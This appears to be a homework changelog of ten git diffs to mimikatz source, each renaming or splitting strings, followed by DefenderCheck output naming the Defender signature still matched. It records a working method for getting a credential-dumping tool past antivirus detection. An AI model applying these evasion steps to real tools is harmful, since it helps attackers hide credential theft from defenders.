# CHANGELOG
* This is where changes will be stored and documented


## 1.patch
### 1.1: git diff -p 
```diff --git a/files/mimikatz/mimikatz/mimikatz.c b/files/mimikatz/mimikatz/mimikatz.c
index 8eeee25..3b513cc 100644
--- a/files/mimikatz/mimikatz/mimikatz.c
+++ b/files/mimikatz/mimikatz/mimikatz.c
@@ -158,7 +158,7 @@ NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
 			status = kuhl_m_kernel_do(full + 1);
 			break;
 		case L'*':
-			status = kuhl_m_rpc_do(full + 1);
+			// status = kuhl_m_rpc_do(full + 1);
 			break;
 		default:
 			status = mimikatz_doLocal(full);
""
```
### 1.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420800 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x109C5B in the original file
File matched signature: "HackTool:Win64/Mikatz!dha"

00000000   00 5F 00 64 00 6F 00 4C  00 6F 00 63 00 61 00 6C   �_�d�o�L�o�c�a�l
00000010   00 20 00 3B 00 20 00 22  00 25 00 73 00 22 00 20   � �;� �"�%�s�"� 
00000020   00 6D 00 6F 00 64 00 75  00 6C 00 65 00 20 00 6E   �m�o�d�u�l�e� �n
00000030   00 6F 00 74 00 20 00 66  00 6F 00 75 00 6E 00 64   �o�t� �f�o�u�n�d
00000040   00 20 00 21 00 0A 00 00  00 00 00 00 00 0A 00 25   � �!�����������%
00000050   00 31 00 36 00 73 00 00  00 00 00 00 00 20 00 20   �1�6�s������� � 
00000060   00 2D 00 20 00 20 00 25  00 73 00 00 00 20 00 20   �-� � �%�s��� � 
00000070   00 5B 00 25 00 73 00 5D  00 00 00 00 00 00 00 00   �[�%�s�]��������
00000080   00 00 00 00 00 45 00 52  00 52 00 4F 00 52 00 20   �����E�R�R�O�R� 
00000090   00 6D 00 69 00 6D 00 69  00 6B 00 61 00 74 00 7A   �m�i�m�i�k�a�t�z
000000A0   00 5F 00 64 00 6F 00 4C  00 6F 00 63 00 61 00 6C   �_�d�o�L�o�c�a�l
000000B0   00 20 00 3B 00 20 00 22  00 25 00 73 00 22 00 20   � �;� �"�%�s�"� 
000000C0   00 63 00 6F 00 6D 00 6D  00 61 00 6E 00 64 00 20   �c�o�m�m�a�n�d� 
000000D0   00 6F 00 66 00 20 00 22  00 25 00 73 00 22 00 20   �o�f� �"�%�s�"� 
000000E0   00 6D 00 6F 00 64 00 75  00 6C 00 65 00 20 00 6E   �m�o�d�u�l�e� �n
000000F0   00 6F 00 74 00 20 00 66  00 6F 00 75 00 6E 00 64   �o�t� �f�o�u�n�d
```


## 2.patch
### 2.1: git diff -p
```diff --git a/files/mimikatz/inc/globals.h b/files/mimikatz/inc/globals.h
index 6c5556b..f667172 100644
--- a/files/mimikatz/inc/globals.h
+++ b/files/mimikatz/inc/globals.h
@@ -29,9 +29,9 @@
 	#define MIMIKATZ_ARCH L"x86"
 #endif
 
-#define MIMIKATZ				L"mimikatz"
+#define MIMIKATZ				L"mk"
 #define MIMIKATZ_VERSION		L"2.2.0"
-#define MIMIKATZ_CODENAME		L"A La Vie, A L\'Amour"
+#define MIMIKATZ_CODENAME		L""
 #define MIMIKATZ_MAX_WINBUILD	L"19041"
 #define MIMIKATZ_FULL			MIMIKATZ L" " MIMIKATZ_VERSION L" (" MIMIKATZ_ARCH L") #" MIMIKATZ_MAX_WINBUILD L" " TEXT(__DATE__) L" " TEXT(__TIME__)
 #define MIMIKATZ_SECOND			L"\"" MIMIKATZ_CODENAME L"\""
""
```
### 2.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x1184BF in the original file
File matched signature: "HackTool:Win32/Mikatz!dha"

00000000   00 43 00 45 00 52 00 54  00 5F 00 4E 00 43 00 52   �C�E�R�T�_�N�C�R
00000010   00 59 00 50 00 54 00 5F  00 4B 00 45 00 59 00 5F   �Y�P�T�_�K�E�Y�_
00000020   00 53 00 50 00 45 00 43  00 20 00 77 00 69 00 74   �S�P�E�C� �w�i�t
00000030   00 68 00 6F 00 75 00 74  00 20 00 43 00 4E 00 47   �h�o�u�t� �C�N�G
00000040   00 20 00 48 00 61 00 6E  00 64 00 6C 00 65 00 20   � �H�a�n�d�l�e� 
00000050   00 3F 00 0A 00 00 00 00  00 00 00 00 00 00 00 00   �?��������������
00000060   00 45 00 52 00 52 00 4F  00 52 00 20 00 6B 00 75   �E�R�R�O�R� �k�u
00000070   00 68 00 6C 00 5F 00 6D  00 5F 00 63 00 72 00 79   �h�l�_�m�_�c�r�y
00000080   00 70 00 74 00 6F 00 5F  00 6C 00 5F 00 63 00 65   �p�t�o�_�l�_�c�e
00000090   00 72 00 74 00 69 00 66  00 69 00 63 00 61 00 74   �r�t�i�f�i�c�a�t
000000A0   00 65 00 73 00 20 00 3B  00 20 00 43 00 72 00 79   �e�s� �;� �C�r�y
000000B0   00 70 00 74 00 41 00 63  00 71 00 75 00 69 00 72   �p�t�A�c�q�u�i�r
000000C0   00 65 00 43 00 65 00 72  00 74 00 69 00 66 00 69   �e�C�e�r�t�i�f�i
000000D0   00 63 00 61 00 74 00 65  00 50 00 72 00 69 00 76   �c�a�t�e�P�r�i�v
000000E0   00 61 00 74 00 65 00 4B  00 65 00 79 00 20 00 28   �a�t�e�K�e�y� �(
000000F0   00 30 00 78 00 25 00 30  00 38 00 78 00 29 00 0A   �0�x�%�0�8�x�)��
```


## 3.patch
### 3.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_pki.c b/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_pki.c
index 83e64ba..2fb0183 100644
--- a/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_pki.c
+++ b/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_pki.c
@@ -317,7 +317,7 @@ BOOL getFromSigner(PCCERT_CONTEXT signer, PKIWI_SIGNER dSigner, HCRYPTPROV_OR_NC
 			if(!status)
 				closeHprov(*bFreeSignerKey, *dwSignerKeySpec, *hSigner);
 		}
-		else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey(signer)");
+		else PRINT_ERROR_AUTO(L"CryptAcquire Certificate Private Key signer");
 	}
 	else if(dSigner)
 	{
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c b/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
index adc7af0..867d6b6 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
@@ -280,7 +280,7 @@ NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
 													}
 												}
 											}
-											else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
+											else PRINT_ERROR_AUTO(L"CryptAcquire Certificate Private Key");
 										}
 									}
 									else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty");
```
### 3.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x11856E in the original file
File matched signature: "HackTool:Win32/Mikatz!dha"

00000000   79 00 70 00 74 00 41 00  63 00 71 00 75 00 69 00   y�p�t�A�c�q�u�i�
00000010   72 00 65 00 20 00 43 00  65 00 72 00 74 00 69 00   r�e� �C�e�r�t�i�
00000020   66 00 69 00 63 00 61 00  74 00 65 00 20 00 50 00   f�i�c�a�t�e� �P�
00000030   72 00 69 00 76 00 61 00  74 00 65 00 20 00 4B 00   r�i�v�a�t�e� �K�
00000040   65 00 79 00 20 00 28 00  30 00 78 00 25 00 30 00   e�y� �(�0�x�%�0�
00000050   38 00 78 00 29 00 0A 00  00 00 00 00 00 00 00 00   8�x�)�����������
00000060   00 00 45 00 52 00 52 00  4F 00 52 00 20 00 6B 00   ��E�R�R�O�R� �k�
00000070   75 00 68 00 6C 00 5F 00  6D 00 5F 00 63 00 72 00   u�h�l�_�m�_�c�r�
00000080   79 00 70 00 74 00 6F 00  5F 00 6C 00 5F 00 63 00   y�p�t�o�_�l�_�c�
00000090   65 00 72 00 74 00 69 00  66 00 69 00 63 00 61 00   e�r�t�i�f�i�c�a�
000000A0   74 00 65 00 73 00 20 00  3B 00 20 00 43 00 65 00   t�e�s� �;� �C�e�
000000B0   72 00 74 00 47 00 65 00  74 00 43 00 65 00 72 00   r�t�G�e�t�C�e�r�
000000C0   74 00 69 00 66 00 69 00  63 00 61 00 74 00 65 00   t�i�f�i�c�a�t�e�
000000D0   43 00 6F 00 6E 00 74 00  65 00 78 00 74 00 50 00   C�o�n�t�e�x�t�P�
000000E0   72 00 6F 00 70 00 65 00  72 00 74 00 79 00 20 00   r�o�p�e�r�t�y� �
000000F0   28 00 30 00 78 00 25 00  30 00 38 00 78 00 29 00   (�0�x�%�0�8�x�)�
```


## 4.patch
### 4.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c b/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
index 867d6b6..2ebc4c0 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
@@ -186,7 +186,7 @@ void kuhl_m_crypto_certificate_descr(PCCERT_CONTEXT pCertContext)
 		kull_m_string_wprintf_hex(sha1, cbSha1, 0);
 		kprintf(L"\n");
 	}
-	else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty(SHA1)");
+	else PRINT_ERROR_AUTO(L"Cert Get Certificate Context Property SHA1");
 }
 
 const DWORD nameSrc[] = {CERT_NAME_FRIENDLY_DISPLAY_TYPE, CERT_NAME_DNS_TYPE, CERT_NAME_EMAIL_TYPE, CERT_NAME_UPN_TYPE, CERT_NAME_URL_TYPE};
@@ -283,7 +283,7 @@ NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
 											else PRINT_ERROR_AUTO(L"CryptAcquire Certificate Private Key");
 										}
 									}
-									else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty");
+									else PRINT_ERROR_AUTO(L"Cert Get Certificate Context Property");
 									LocalFree(pBuffer);
 								}
 							}
```
### 4.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x1185FF in the original file
File matched signature: "HackTool:Win32/Mikatz!dha"

00000000   00 72 00 74 00 69 00 66  00 69 00 63 00 61 00 74   �r�t�i�f�i�c�a�t
00000010   00 65 00 73 00 20 00 3B  00 20 00 43 00 65 00 72   �e�s� �;� �C�e�r
00000020   00 74 00 20 00 47 00 65  00 74 00 20 00 43 00 65   �t� �G�e�t� �C�e
00000030   00 72 00 74 00 69 00 66  00 69 00 63 00 61 00 74   �r�t�i�f�i�c�a�t
00000040   00 65 00 20 00 43 00 6F  00 6E 00 74 00 65 00 78   �e� �C�o�n�t�e�x
00000050   00 74 00 20 00 50 00 72  00 6F 00 70 00 65 00 72   �t� �P�r�o�p�e�r
00000060   00 74 00 79 00 20 00 28  00 30 00 78 00 25 00 30   �t�y� �(�0�x�%�0
00000070   00 38 00 78 00 29 00 0A  00 00 00 00 00 00 00 00   �8�x�)����������
00000080   00 45 00 52 00 52 00 4F  00 52 00 20 00 6B 00 75   �E�R�R�O�R� �k�u
00000090   00 68 00 6C 00 5F 00 6D  00 5F 00 63 00 72 00 79   �h�l�_�m�_�c�r�y
000000A0   00 70 00 74 00 6F 00 5F  00 6C 00 5F 00 63 00 65   �p�t�o�_�l�_�c�e
000000B0   00 72 00 74 00 69 00 66  00 69 00 63 00 61 00 74   �r�t�i�f�i�c�a�t
000000C0   00 65 00 73 00 20 00 3B  00 20 00 43 00 65 00 72   �e�s� �;� �C�e�r
000000D0   00 74 00 47 00 65 00 74  00 4E 00 61 00 6D 00 65   �t�G�e�t�N�a�m�e
000000E0   00 53 00 74 00 72 00 69  00 6E 00 67 00 20 00 28   �S�t�r�i�n�g� �(
000000F0   00 30 00 78 00 25 00 30  00 38 00 78 00 29 00 0A   �0�x�%�0�8�x�)��
```


## 5.patch
### 5.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c b/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
index 2ebc4c0..06c38f2 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_crypto.c
@@ -291,12 +291,12 @@ NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
 								kuhl_m_crypto_exportCert(pCertContext, (BOOL) dwSizeNeeded, szSystemStore, szStore, i, certName);
 							kprintf(L"\n");
 						}
-						else PRINT_ERROR_AUTO(L"CertGetNameString");
+						else PRINT_ERROR_AUTO(L"Cert Get Name String");
 						LocalFree(certName);
 					}
 					break;
 				}
-				else PRINT_ERROR_AUTO(L"CertGetNameString (for len)");
+				else PRINT_ERROR_AUTO(L"Cert Get Name String for len");
 			}
 		}
 		CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
```
### 5.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x11D7B8 in the original file
File matched signature: "HackTool:Win32/LSADump!dha"

00000000   00 00 00 00 00 00 00 00  45 00 52 00 52 00 4F 00   ��������E�R�R�O�
00000010   52 00 20 00 6B 00 75 00  68 00 6C 00 5F 00 6D 00   R� �k�u�h�l�_�m�
00000020   5F 00 6C 00 73 00 61 00  64 00 75 00 6D 00 70 00   _�l�s�a�d�u�m�p�
00000030   5F 00 73 00 61 00 6D 00  20 00 3B 00 20 00 43 00   _�s�a�m� �;� �C�
00000040   72 00 65 00 61 00 74 00  65 00 46 00 69 00 6C 00   r�e�a�t�e�F�i�l�
00000050   65 00 20 00 28 00 53 00  41 00 4D 00 20 00 68 00   e� �(�S�A�M� �h�
00000060   69 00 76 00 65 00 29 00  20 00 28 00 30 00 78 00   i�v�e�)� �(�0�x�
00000070   25 00 30 00 38 00 78 00  29 00 0A 00 00 00 00 00   %�0�8�x�)�������
00000080   00 00 00 00 00 00 00 00  45 00 52 00 52 00 4F 00   ��������E�R�R�O�
00000090   52 00 20 00 6B 00 75 00  68 00 6C 00 5F 00 6D 00   R� �k�u�h�l�_�m�
000000A0   5F 00 6C 00 73 00 61 00  64 00 75 00 6D 00 70 00   _�l�s�a�d�u�m�p�
000000B0   5F 00 73 00 61 00 6D 00  20 00 3B 00 20 00 43 00   _�s�a�m� �;� �C�
000000C0   72 00 65 00 61 00 74 00  65 00 46 00 69 00 6C 00   r�e�a�t�e�F�i�l�
000000D0   65 00 20 00 28 00 53 00  59 00 53 00 54 00 45 00   e� �(�S�Y�S�T�E�
000000E0   4D 00 20 00 68 00 69 00  76 00 65 00 29 00 20 00   M� �h�i�v�e�)� �
000000F0   28 00 30 00 78 00 25 00  30 00 38 00 78 00 29 00   (�0�x�%�0�8�x�)�
```


## 6.patch
### 6.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 510dd9c..01dcc77 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -65,7 +65,7 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 			}
 			CloseHandle(hDataSystem);
 		}
-		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+		else PRINT_ERROR_AUTO(L"Create File SYSTEM hive");
 	}
 	else
 	{
@@ -214,7 +214,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 				kull_m_registry_close(hSystem);
 			}
 			CloseHandle(hDataSystem);
-		} else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+		} else PRINT_ERROR_AUTO(L"Create File SYSTEM hive");
 	}
 	else
 	{
@@ -2440,7 +2440,7 @@ NTSTATUS kuhl_m_lsadump_mbc(int argc, wchar_t * argv[])
 			}
 			CloseHandle(hDataSystem);
 		}
-		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+		else PRINT_ERROR_AUTO(L"Create File SYSTEM hive");
 	}
 	else
 	{
```
### 6.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x11F987 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   00 72 00 76 00 2E 00 64  00 6C 00 6C 00 00 00 00   �r�v�.�d�l�l����
00000010   00 6C 00 73 00 61 00 73  00 72 00 76 00 2E 00 64   �l�s�a�s�r�v�.�d
00000020   00 6C 00 6C 00 00 00 00  00 6E 00 74 00 64 00 6C   �l�l�����n�t�d�l
00000030   00 6C 00 2E 00 64 00 6C  00 6C 00 00 00 00 00 00   �l�.�d�l�l������
00000040   00 6B 00 65 00 72 00 6E  00 65 00 6C 00 33 00 32   �k�e�r�n�e�l�3�2
00000050   00 2E 00 64 00 6C 00 6C  00 00 00 00 00 00 00 00   �.�d�l�l��������
00000060   00 53 61 6D 49 43 6F 6E  6E 65 63 74 00 00 00 00   �SamIConnect����
00000070   00 53 61 6D 72 43 6C 6F  73 65 48 61 6E 64 6C 65   �SamrCloseHandle
00000080   00 53 61 6D 49 52 65 74  72 69 65 76 65 50 72 69   �SamIRetrievePri
00000090   6D 61 72 79 43 72 65 64  65 6E 74 69 61 6C 73 00   maryCredentials�
000000A0   00 53 61 6D 72 4F 70 65  6E 44 6F 6D 61 69 6E 00   �SamrOpenDomain�
000000B0   00 53 61 6D 72 4F 70 65  6E 55 73 65 72 00 00 00   �SamrOpenUser���
000000C0   00 53 61 6D 72 51 75 65  72 79 49 6E 66 6F 72 6D   �SamrQueryInform
000000D0   61 74 69 6F 6E 55 73 65  72 00 00 00 00 00 00 00   ationUser�������
000000E0   00 53 61 6D 49 46 72 65  65 5F 53 41 4D 50 52 5F   �SamIFree_SAMPR_
000000F0   55 53 45 52 5F 49 4E 46  4F 5F 42 55 46 46 45 52   USER_INFO_BUFFER
```


## 7.patch
### 7.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 01dcc77..74aa930 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -1324,7 +1324,7 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 		{szSamSrv,	"SamrOpenDomain",					(PVOID) 0x4444444444444444, NULL},
 		{szSamSrv,	"SamrOpenUser",						(PVOID) 0x4545454545454545, NULL},
 		{szSamSrv,	"SamrQueryInformationUser",			(PVOID) 0x4646464646464646, NULL},
-		{szSamSrv,	"SamIFree_SAMPR_USER_INFO_BUFFER",	(PVOID) 0x4747474747474747, NULL},
+		{szSamSrv,	"Sam I Free_SAMPR_USER_INFO_BUFFER",	(PVOID) 0x4747474747474747, NULL},
 		{szKernel32,"VirtualAlloc",						(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
 		{szKernel32,"LocalFree",						(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
 		{szNtDll,	"memcpy",							(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
```
### 7.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x123878 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   6C 00 00 00 00 00 00 00  63 00 6C 00 69 00 70 00   l�������c�l�i�p�
00000010   00 00 00 00 00 00 00 00  78 00 6F 00 72 00 00 00   ��������x�o�r���
00000020   61 00 61 00 64 00 63 00  6F 00 6F 00 6B 00 69 00   a�a�d�c�o�o�k�i�
00000030   65 00 00 00 00 00 00 00  6E 00 67 00 63 00 73 00   e�������n�g�c�s�
00000040   69 00 67 00 6E 00 00 00  73 00 70 00 6F 00 6F 00   i�g�n���s�p�o�o�
00000050   6C 00 65 00 72 00 00 00  6D 00 69 00 73 00 63 00   l�e�r���m�i�s�c�
00000060   00 00 00 00 00 00 00 00  4D 00 69 00 73 00 63 00   ��������M�i�s�c�
00000070   65 00 6C 00 6C 00 61 00  6E 00 65 00 6F 00 75 00   e�l�l�a�n�e�o�u�
00000080   73 00 20 00 6D 00 6F 00  64 00 75 00 6C 00 65 00   s� �m�o�d�u�l�e�
00000090   00 00 00 00 00 00 00 00  4B 00 69 00 77 00 69 00   ��������K�i�w�i�
000000A0   41 00 6E 00 64 00 43 00  4D 00 44 00 00 00 00 00   A�n�d�C�M�D�����
000000B0   44 00 69 00 73 00 61 00  62 00 6C 00 65 00 43 00   D�i�s�a�b�l�e�C�
000000C0   4D 00 44 00 00 00 00 00  63 00 6D 00 64 00 2E 00   M�D�����c�m�d�.�
000000D0   65 00 78 00 65 00 00 00  4B 00 69 00 77 00 69 00   e�x�e���K�i�w�i�
000000E0   41 00 6E 00 64 00 52 00  65 00 67 00 69 00 73 00   A�n�d�R�e�g�i�s�
000000F0   74 00 72 00 79 00 54 00  6F 00 6F 00 6C 00 73 00   t�r�y�T�o�o�l�s�
```


## 8.patch
### 8.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_misc.c b/files/mimikatz/mimikatz/modules/kuhl_m_misc.c
index 73f0965..1adaaa1 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_misc.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_misc.c
@@ -42,7 +42,7 @@ NTSTATUS kuhl_m_misc_cmd(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_misc_regedit(int argc, wchar_t * argv[])
 {
-	kuhl_m_misc_generic_nogpo_patch(L"regedit.exe", L"DisableRegistryTools", sizeof(L"DisableRegistryTools"), L"KiwiAndRegistryTools", sizeof(L"KiwiAndRegistryTools"));
+	kuhl_m_misc_generic_nogpo_patch(L"regedit.exe", L"DisableRegistryTools", sizeof(L"DisableRegistryTools"), L"Kiwi And Registry Tools", sizeof(L"Kiwi And Registry Tools"));
 	return STATUS_SUCCESS;
 }
```
### 8.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x12D6C2 in the original file
File matched signature: "HackTool:Win32/Mimikatz.H"

00000000   64 00 20 00 45 00 76 00  65 00 72 00 79 00 74 00   d� �E�v�e�r�y�t�
00000010   68 00 69 00 6E 00 67 00  00 00 00 00 00 00 63 00   h�i�n�g�������c�
00000020   6F 00 66 00 66 00 65 00  65 00 00 00 00 00 50 00   o�f�f�e�e�����P�
00000030   6C 00 65 00 61 00 73 00  65 00 2C 00 20 00 6D 00   l�e�a�s�e�,� �m�
00000040   61 00 6B 00 65 00 20 00  6D 00 65 00 20 00 61 00   a�k�e� �m�e� �a�
00000050   20 00 63 00 6F 00 66 00  66 00 65 00 65 00 21 00    �c�o�f�f�e�e�!�
00000060   00 00 00 00 00 00 73 00  6C 00 65 00 65 00 70 00   ������s�l�e�e�p�
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 53 00   ��������������S�
00000080   6C 00 65 00 65 00 70 00  20 00 61 00 6E 00 20 00   l�e�e�p� �a�n� �
00000090   61 00 6D 00 6F 00 75 00  6E 00 74 00 20 00 6F 00   a�m�o�u�n�t� �o�
000000A0   66 00 20 00 6D 00 69 00  6C 00 6C 00 69 00 73 00   f� �m�i�l�l�i�s�
000000B0   65 00 63 00 6F 00 6E 00  64 00 73 00 00 00 4C 00   e�c�o�n�d�s���L�
000000C0   6F 00 67 00 20 00 6D 00  69 00 6D 00 69 00 6B 00   o�g� �m�i�m�i�k�
000000D0   61 00 74 00 7A 00 20 00  69 00 6E 00 70 00 75 00   a�t�z� �i�n�p�u�
000000E0   74 00 2F 00 6F 00 75 00  74 00 70 00 75 00 74 00   t�/�o�u�t�p�u�t�
000000F0   20 00 74 00 6F 00 20 00  66 00 69 00 6C 00 65 00    �t�o� �f�i�l�e�
```


## 9.patch
### 9.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_standard.c b/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
index f57d6d9..37583dc 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
@@ -12,7 +12,7 @@ const KUHL_M_C kuhl_m_c_standard[] = {
 	{kuhl_m_standard_answer,	L"answer",		L"Answer to the Ultimate Question of Life, the Universe, and Everything"},
 	{kuhl_m_standard_coffee,	L"coffee",		L"Please, make me a coffee!"},
 	{kuhl_m_standard_sleep,		L"sleep",		L"Sleep an amount of milliseconds"},
-	{kuhl_m_standard_log,		L"log",			L"Log mimikatz input/output to file"},
+	{kuhl_m_standard_log,		L"log",			L"Log mk input/output to file"},
 	{kuhl_m_standard_base64,	L"base64",		L"Switch file input/output base64"},
 	{kuhl_m_standard_version,	L"version",		L"Display some version informations"},
 	{kuhl_m_standard_cd,		L"cd",			L"Change or display current directory"},
```
### 9.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x12DAFE in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   6C 00 6F 00 67 00 00 00  00 00 55 00 73 00 69 00   l�o�g�����U�s�i�
00000010   6E 00 67 00 20 00 27 00  25 00 73 00 27 00 20 00   n�g� �'�%�s�'� �
00000020   66 00 6F 00 72 00 20 00  6C 00 6F 00 67 00 66 00   f�o�r� �l�o�g�f�
00000030   69 00 6C 00 65 00 20 00  3A 00 20 00 25 00 73 00   i�l�e� �:� �%�s�
00000040   0A 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ����������������
00000050   00 00 69 00 73 00 42 00  61 00 73 00 65 00 36 00   ��i�s�B�a�s�e�6�
00000060   34 00 49 00 6E 00 74 00  65 00 72 00 63 00 65 00   4�I�n�t�e�r�c�e�
00000070   70 00 74 00 49 00 6E 00  70 00 75 00 74 00 20 00   p�t�I�n�p�u�t� �
00000080   20 00 69 00 73 00 20 00  25 00 73 00 0A 00 69 00    �i�s� �%�s���i�
00000090   73 00 42 00 61 00 73 00  65 00 36 00 34 00 49 00   s�B�a�s�e�6�4�I�
000000A0   6E 00 74 00 65 00 72 00  63 00 65 00 70 00 74 00   n�t�e�r�c�e�p�t�
000000B0   4F 00 75 00 74 00 70 00  75 00 74 00 20 00 69 00   O�u�t�p�u�t� �i�
000000C0   73 00 20 00 25 00 73 00  0A 00 00 00 00 00 00 00   s� �%�s���������
000000D0   00 00 74 00 73 00 70 00  6B 00 67 00 2E 00 64 00   ��t�s�p�k�g�.�d�
000000E0   6C 00 6C 00 00 00 00 00  00 00 77 00 64 00 69 00   l�l�������w�d�i�
000000F0   67 00 65 00 73 00 74 00  2E 00 64 00 6C 00 6C 00   g�e�s�t�.�d�l�l�
```


## 10.patch
### 10.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_standard.c b/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
index 37583dc..18085ac 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
@@ -87,9 +87,9 @@ NTSTATUS kuhl_m_standard_base64(int argc, wchar_t * argv[])
 	kprintf(L"isBase64InterceptInput  is %s\nisBase64InterceptOutput is %s\n", isBase64InterceptInput ? L"true" : L"false", isBase64InterceptOutput ? L"true" : L"false");
 	return STATUS_SUCCESS;
 }
-
+const wchar_t wdg[] = { L'w', L'd', L'i', L'g', L'e', L's', L't', L'.', L'd', L'l', L'l', 0x0 };
 const wchar_t *version_libs[] = {
-	L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll", L"livessp.dll", L"dpapisrv.dll",
+	L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", wdg, L"kerberos.dll", L"livessp.dll", L"dpapisrv.dll",
 	L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll", L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll",
 	L"eventlog.dll", L"wevtsvc.dll", L"termsrv.dll",
 };
```
### 10.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x11F8BC in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   65 00 63 00 5F 00 61 00  65 00 73 00 32 00 35 00   e�c�_�a�e�s�2�5�
00000010   36 00 20 00 3B 00 20 00  43 00 72 00 79 00 70 00   6� �;� �C�r�y�p�
